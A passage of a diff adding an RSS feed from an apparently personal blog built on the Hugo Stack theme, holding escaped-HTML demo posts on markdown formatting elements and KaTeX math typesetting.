+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="code-block-indented-with-four-spaces">Code block indented with four spaces&lt;/h3>
+&lt;pre>&lt;code>&amp;lt;!doctype html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+&amp;lt;title&amp;gt;Example HTML5 Document&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;p&amp;gt;Test&amp;lt;/p&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>
+&lt;h3 id="diff-code-block">Diff code block&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-diff" data-lang="diff">&lt;span class="line">&lt;span class="cl">[dependencies.bevy]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git = &amp;#34;https://github.com/bevyengine/bevy&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rev = &amp;#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="gd">- features = [&amp;#34;dynamic&amp;#34;]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="gd">&lt;/span>&lt;span class="gi">+ features = [&amp;#34;jpeg&amp;#34;, &amp;#34;dynamic&amp;#34;]
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="one-line-code-block">One line code block&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>A paragraph&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="list-types">List Types&lt;/h2>
+&lt;h3 id="ordered-list">Ordered List&lt;/h3>
+&lt;ol>
+&lt;li>First item&lt;/li>
+&lt;li>Second item&lt;/li>
+&lt;li>Third item&lt;/li>
+&lt;/ol>
+&lt;h3 id="unordered-list">Unordered List&lt;/h3>
+&lt;ul>
+&lt;li>List item&lt;/li>
+&lt;li>Another item&lt;/li>
+&lt;li>And another item&lt;/li>
+&lt;/ul>
+&lt;h3 id="nested-list">Nested list&lt;/h3>
+&lt;ul>
+&lt;li>Fruit
+&lt;ul>
+&lt;li>Apple&lt;/li>
+&lt;li>Orange&lt;/li>
+&lt;li>Banana&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Dairy
+&lt;ul>
+&lt;li>Milk&lt;/li>
+&lt;li>Cheese&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="other-elements--abbr-sub-sup-kbd-mark">Other Elements — abbr, sub, sup, kbd, mark&lt;/h2>
+&lt;p>&lt;abbr title="Graphics Interchange Format">GIF&lt;/abbr> is a bitmap image format.&lt;/p>
+&lt;p>H&lt;sub>2&lt;/sub>O&lt;/p>
+&lt;p>X&lt;sup>n&lt;/sup> + Y&lt;sup>n&lt;/sup> = Z&lt;sup>n&lt;/sup>&lt;/p>
+&lt;p>Press &lt;kbd>CTRL&lt;/kbd> + &lt;kbd>ALT&lt;/kbd> + &lt;kbd>Delete&lt;/kbd> to end the session.&lt;/p>
+&lt;p>Most &lt;mark>salamanders&lt;/mark> are nocturnal, and hunt for insects, worms, and other small creatures.&lt;/p>
+&lt;div class="footnotes" role="doc-endnotes">
+&lt;hr>
+&lt;ol>
+&lt;li id="fn:1">
+&lt;p>The above quote is excerpted from Rob Pike&amp;rsquo;s &lt;a class="link" href="https://www.youtube.com/watch?v=PAAkCSZUG1c" target="_blank" rel="noopener"
+>talk&lt;/a> during Gopherfest, November 18, 2015.&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;/div></description></item><item><title>Math Typesetting (Perhaps useful for some Crypto WriteUp ;)</title><link>https://shaanksm.github.io/p/math-typesetting-perhaps-useful-for-some-crypto-writeup/</link><pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate><guid>https://shaanksm.github.io/p/math-typesetting-perhaps-useful-for-some-crypto-writeup/</guid><description>&lt;p>Stack has built-in support for math typesetting using &lt;a class="link" href="https://katex.org/" target="_blank" rel="noopener"
+>KaTeX&lt;/a>.&lt;/p>
+&lt;p>&lt;strong>It&amp;rsquo;s not enabled by default side-wide,&lt;/strong> but you can enable it for individual posts by adding &lt;code>math: true&lt;/code> to the front matter. Or you can enable it side-wide by adding &lt;code>math = true&lt;/code> to the &lt;code>params.article&lt;/code> section in &lt;code>config.toml&lt;/code>.&lt;/p>
+&lt;h2 id="inline-math">Inline math&lt;/h2>
+&lt;p>This is an inline mathematical expression: $\varphi = \dfrac{1+\sqrt5}{2}= 1.6180339887…$&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">$\varphi = \dfrac{1+\sqrt5}{2}= 1.6180339887…$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="block-math">Block math&lt;/h2>
+&lt;p>$$
+\varphi = 1+\frac{1} {1+\frac{1} {1+\frac{1} {1+\cdots} } }
+$$&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> \varphi = 1+\frac{1} {1+\frac{1} {1+\frac{1} {1+\cdots} } }
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>$$
+f(x) = \int_{-\infty}^\infty\hat f(\xi),e^{2 \pi i \xi x},d\xi
+$$&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> f(x) = \int_{-\infty}^\infty\hat f(\xi)\,e^{2 \pi i \xi x}\,d\xi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
